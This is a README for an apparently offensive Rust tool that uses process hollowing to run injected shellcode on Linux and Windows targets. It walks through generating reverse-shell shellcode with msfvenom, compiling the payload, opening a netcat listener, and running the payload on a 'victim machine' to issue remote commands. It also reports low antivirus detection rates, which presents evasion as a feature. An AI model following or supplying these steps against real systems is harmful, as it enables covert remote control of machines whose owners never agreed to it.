# RCO: Process Hollowing

[![Custom badge](https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkmanc%2Fremote_code_oxidation%2Fmaster%2F.custom_shields%2Fprocess_hollowing.json)](https://github.com/kmanc/remote_code_oxidation/tree/master/process_hollowing)

Linux target               |  Windows target
:-------------------------:|:-------------------------:
![](https://user-images.githubusercontent.com/14863147/151645583-68e054fc-ba49-4691-bca6-4e924f8ad498.gif)  |  ![](https://user-images.githubusercontent.com/14863147/151642061-6df0f601-3f07-4e0c-aaf5-fbbc229de2e0.gif)


## How it works

Windows process hollowing works by createing a suspended process and writing the [shellcode](https://en.wikipedia.org/wiki/Shellcode) over the entry point of the process's main thread. It then resumes the suspended process, which in turn executes the shellcode.

Linux process hollowing functions a little differently. The executable first creates a child process that is a clone of itself. Then it overwrites the child process's [instruction pointer](https://datacadamia.com/computer/instruction/instruction_pointer) with shellcode. Because this process was not running before, it is unlikely this will cause any issues on the victim machine.

## Using it

1. [Not shown in GIF] Generate shellcode for the desired end result (for example, use [msfvenom](https://book.hacktricks.xyz/shells/shells/msfvenom) to generate a reverse TCP shell shellcode for the target operating system)
2. Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
and change the shellcode to the shellcode generated in step 1
3. Compile the executable

    #### Build for Linux target
    ```commandline
    cargo build -p process_hollowing --release
    ```

    #### Build for Windows target
    ```commandline
    cargo build --target x86_64-pc-windows-gnu -p process_hollowing --release
    ```
4. Start a netcat listener on the attacking machine on the same port you configured the shellcode to connect to in step 1
    ```commandline
    nc -nlvp 4444
    ```   
5. Execute the payload on the victim machine
6. Return to the listener and enter desired commands for the victim machine to run


## Detection rates

[Linux - 7 / 40](https://kleenscan.com/scan_result/c9dd1d93fa8a1a62d136b0f3fbe22fb21cbf65851271e73b177624fd5afbdef9)

![image](https://user-images.githubusercontent.com/14863147/151645694-c5962e70-a507-4352-8e23-9e452da19c96.png)

[Windows - 13 / 40](https://kleenscan.com/scan_result/6b7fd667a386059a55c8408affc1c8365859c27cd8ad247ca191c2c0796e1ad4)

![image](https://user-images.githubusercontent.com/14863147/151645657-e1924972-f817-40a1-91a6-520e82a7dc01.png)
